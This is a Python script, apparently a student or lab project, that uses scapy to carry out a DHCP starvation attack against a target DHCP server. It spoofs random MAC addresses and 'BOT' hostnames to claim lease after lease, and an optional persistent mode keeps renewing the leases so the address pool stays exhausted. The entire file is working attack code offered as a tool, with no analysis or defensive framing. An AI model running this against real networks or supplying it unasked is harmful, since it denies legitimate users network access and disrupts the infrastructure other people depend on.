import binascii
from scapy.all import *
import datetime
from random import randint
from threading import Thread
import argparse
from time import sleep
import sys
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether


class Lease:
    """
    represent a leases ip object.
    """
    botNumber = 0  # class var. indicate he number of bots
    MAX_TRANS_ID = 0xFFFFFFFF  # the max number for DHCP transaction id

    def __init__(self, target, interface=""):
        """
        c'tor.
        :param target: the target server's IP which we going to attack
        :type target: str
        :param interface: the interface to work with
        :type interface: str
        :return: new Lease object
        """
        # init and generate the new data
        self.mac = self.rand_mac()
        self.release = datetime.datetime.now()
        self.new_xid()
        self.hostname = f"BOT{Lease.botNumber}"
        Lease.botNumber += 1
        self.active = False
        self.ip = ""
        self.time = ""
        self.dest_mac = ""
        self.sniffer = Sniffer(target, self, interface)
        sendp(build_discover(self.mac, self.xid, self.hostname), iface=interface, verbose=False)
        self.sniffer.run()

    def new_xid(self):
        """
        get new random transaction ID
        """
        self.xid = randint(0, 0xFFFFFFFF)  # transaction ID

    @staticmethod
    def rand_mac():
        """
        :return: a new random mac address
        :rtype: str
        """
        return "52:54:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))


def get_option(dhcp_options, key):
    """
    In DHCP header there are some options,
    so we taking care on them too (in order to prevent the script to break)
    TODO: NAOR, please explain what this function do! ty :) <3
    :param dhcp_options:
    :param key:
    :return:
    """
    must_decode = ['hostname', 'domain', 'vendor_class_id']
    try:
        for i in dhcp_options:
            if i[0] == key:
                # If DHCP Server Returned multiple name servers
                # return all as comma seperated string.
                if key == 'name_server' and len(i) > 2:
                    return ",".join(i[1:])
                # domain and hostname are binary strings,
                # decode to unicode string before returning
                elif key in must_decode:
                    return i[1].decode()
                else:
                    return i[1]
    except:
        pass


def build_discover(local_mac_addr, trans_id, hostname):
    """
    build a DHCP discover packet
    :param local_mac_addr: the mac address
    :param trans_id: the transaction IDx
    :param hostname: the host name
    :return: scapy DHCP discover packet
    """
    return Ether(src=local_mac_addr, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") \
           / UDP(sport=68, dport=67) / BOOTP(chaddr=str_2_mac(local_mac_addr), xid=trans_id) \
           / DHCP(options=[("message-type", "discover"), ("hostname", hostname), "end"])


def build_request(mac_addr, target, req_ip, hostname, trans_id):
    """
    build a DHCP request packet
    :param mac_addr: the mac address
    :param target: the target server's ip which we are going to attack. (this is the dst ip)
    :param req_ip: the requested IP
    :param hostname: the host name
    :param trans_id: the transaction ID
    :return: scapy DHCP request packet
    """
    return Ether(src=str(mac_addr), dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") \
           / UDP(sport=68, dport=67) / BOOTP(chaddr=str_2_mac(mac_addr), xid=trans_id) \
           / DHCP(options=[("message-type", "request"), ("server_id", target), ("requested_addr", req_ip),
                           ("hostname", hostname), ("param_req_list", 0), "end"])


def build_renew(src_mac, dst_mac, src_ip, target, req_ip, hostname, trans_id):
    """
    build a renew DHCP request
    :param src_mac: the src mac
    :param dst_mac: the dst mac
    :param src_ip: the src ip
    :param target: the target server's ip which we are going to attack. (this is the dst ip)
    :type target: str
    :param req_ip: the requested IP
    :param hostname: the host name
    :param trans_id: the transaction ID
    :type trans_id: int
    :return: DHCP renew request packet
    :rtype: scapy DHCP packet
    """
    return Ether(src=str(src_mac), dst=str(dst_mac)) / IP(src=src_ip, dst=target) / UDP(sport=68, dport=67) \
           / BOOTP(chaddr=str_2_mac(src_mac), xid=trans_id) \
           / DHCP(options=[("message-type", "request"), ("server_id", target), ("requested_addr", req_ip),
                           ("hostname", hostname), ("param_req_list", 0), "end"])


def str_2_mac(mac_addr):
    """
    build a legal mac address from the given mac string
    :param mac_addr: the mac address
    :type mac_addr: str
    :return:
    """
    return binascii.unhexlify(mac_addr.replace(":", ""))


class Sniffer:
    """
    This class management the sniffing and diagnostic of the DHCP packets
    """

    def __init__(self, target, leased_pc, interface):
        """
        c'tor
        :param target: the target server's IP which we going to attack
        :type target: str
        :param leased_pc: the leases IP
        :type leased_pc: str
        :param interface: the interface to work with
        :type interface: str
        :param interface:
        """
        """

        :param target: the target server ip which we are going to attack.
        :type target: str
        :param leased_pc: the leases ip object
        :type target: Lease
        :param interface: the interface we going to use
        :type interface: str
        :return:
        """
        self.target = target
        self.interface = interface
        self.leased_pc = leased_pc
        self.stop_sniff = False

    def run(self):
        """
        Management the DHCP packets sniffing.
        """
        # sniffing dhcp packets until the self.stop_sniff var says to stop (it change thorough the prn func)
        if self.interface is not None:
            sniff(iface=self.interface, filter="udp and (port 67 or 68)", prn=self.handle_dhcp_packet,
                  stop_filter=lambda pkt: self.stop_sniff)
        else:  # - sniffing the default interface
            sniff(filter="udp and (port 67 or 68)", prn=self.handle_dhcp_packet,
                  stop_filter=lambda pkt: self.stop_sniff)

    def handle_dhcp_packet(self, pkt):
        """
        Determined it the DHCP packet is offer or request and acts accordingly to it.
        :param pkt: the DHCP packet
        :type pkt: scapy DHCP packet
        """
        # break if it isn't our transaction id:
        if self.leased_pc.xid != pkt[BOOTP].xid:
            return
        # if pkt is DHCP offer packet:
        if DHCP in pkt and pkt[DHCP].options[0][1] == 2 and pkt[IP].src == self.target:
            # build the DHCP request packet and send it
            sendp(build_request(self.leased_pc.mac, self.target, str(pkt[BOOTP].yiaddr), self.leased_pc.hostname,
                                self.leased_pc.xid), iface=self.interface, verbose=False)
            self.leased_pc.dst_mac = str(pkt[Ether].src)

        # if pkt is DHCP ack packet:
        elif DHCP in pkt and pkt[DHCP].options[0][1] == 5 and pkt[IP].src == self.target:
            # save the new leased ip data
            lease_time = get_option(pkt[DHCP].options, 'lease_time')
            self.leased_pc.release = datetime.datetime.now() + datetime.timedelta(seconds=lease_time)
            self.leased_pc.time = lease_time
            self.leased_pc.active = True
            self.leased_pc.ip = pkt[BOOTP].yiaddr
            self.leased_pc.dst_mac = str(pkt[Ether].src)
            self.stop_sniff = True


class Starvation:
    """
    This is the main class.
    It's management the DHCP Starvation attack.
    """

    def __init__(self, target, interface, persist):
        """
        c'tor
        :param target: the to attack server's ip
        :type target: string
        :param interface: from which interface we work
        :type interface: string
        :param persist: whether or not it's a persist attack
        :type persist: bool
        :return: new Starvation object
        """
        self.target = target
        self.interface = interface
        self.Leases = []  # list of Leases ips
        self.persist = persist

    def print_leases(self):
        """
        print the list of leases ips
        """
        threading.Thread()
        leases_2_print = "----------------leases----------------\n"
        for lease in self.Leases:
            leases_2_print += f"{lease.hostname}: {lease.mac}, {lease.ip} , Release in {lease.release}\n"
        leases_2_print += "------------End of leases----------------\n"
        print(leases_2_print, end="")

    def run(self):
        """
        run the DHCP Starvation attack (persistent and/or no-persistent)
        """
        if self.persist:
            t = Thread(target=self.persistent)
            t.start()  # start the persistent attack in a separate thread
        while True:
            # create and add new leases ip to the list
            self.Leases.append(Lease(self.target, self.interface))
            self.print_leases()

    def persistent(self):
        """
        Implement the persistent attack,
        when it's the time to RENEW the IP addr (50%-87.5% from the lease time over) -
        send again a DHCP request to the target server, make sure this IP stay occupied.
        """
        while True:
            for i, lease in enumerate(self.Leases):  # for each lease ip:
                # check if it's the time to renew the IP.
                if lease.active and lease.dst_mac != "" and 0.5 <= (
                        lease.time - (lease.release - datetime.datetime.now()).seconds) / lease.time <= 0.875:
                    lease.new_xid()  # create new transaction ID
                    # build the DHCP request and send it, also saving the answer.
                    pkt = srp1(build_renew(lease.mac, lease.dst_mac, lease.ip, self.target, lease.ip, lease.hostname,
                                           lease.xid), iface=self.interface, verbose=False)

                    # calc the new lease time:
                    lease_time = get_option(pkt[DHCP].options, 'lease_time')
                    lease.release = datetime.datetime.now() + datetime.timedelta(seconds=lease_time)

                    lease.ip = pkt[BOOTP].yiaddr

                    # print the data
                    print("-----------persistent-----------")
                    remain = str(lease.release - datetime.datetime.now()) if lease.active else "Not Active"
                    print(f"{lease.hostname}: {lease.mac}, {lease.ip} , Release in {remain}\n")
                    print("---------END OF persistent---------")
                    self.print_leases()
            sleep(1)  # delay


def get_args():
    """
    Command line argument parsing methods,
    get the argument that the user entered and acts accordingly to it.
    :return: the args
    """
    parser = argparse.ArgumentParser(description='DHCP Starvation')

    # set up the arguments
    parser.add_argument("-p", "--persist ", help="persistant?", dest='persist')
    parser.add_argument("-i", "--iface ", metavar="IFACE", help="Interface you wish to use", dest='iface')
    parser.add_argument("-t", "--target ", metavar="TARGET", help="IP of target server", dest='target', required=True)
    return parser.parse_args()


def main():
    args = get_args()
    # activate sniffer
    print(args.persist)
    starvation = Starvation(args.target, args.iface, args.persist)
    print("[*] Start starvation...")
    starvation.run()
    print("[*] Stop starvation")


if __name__ == '__main__':
    main()
